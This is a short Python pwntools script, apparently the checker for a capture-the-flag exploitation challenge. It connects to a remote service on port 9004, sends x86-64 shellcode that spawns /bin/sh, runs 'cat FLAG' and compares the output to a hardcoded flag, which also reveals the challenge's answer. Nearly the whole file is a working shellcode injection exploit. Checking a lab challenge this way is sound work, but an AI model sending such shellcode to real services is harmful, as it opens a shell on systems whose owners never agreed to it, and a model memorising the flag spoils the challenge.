from pwn import *
import sys
import time


def checker(host, port):
    try:
        pc = connect(host, port)
        # pc = process("./chall")
    except:
        return 2
    shell_code = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
    pc.sendline(shell_code)
    time.sleep(1)
    pc.sendline(b"cat FLAG")
    ret = pc.recvall(timeout=10)
    if b"FLAG{NXbit_Blocks_shellcode_next_step_is_ROP}" in ret:
        return 0
    else:
        return 1


if __name__ == "__main__":
    if checker(sys.argv[1], 9004) != 0:
        exit(1)
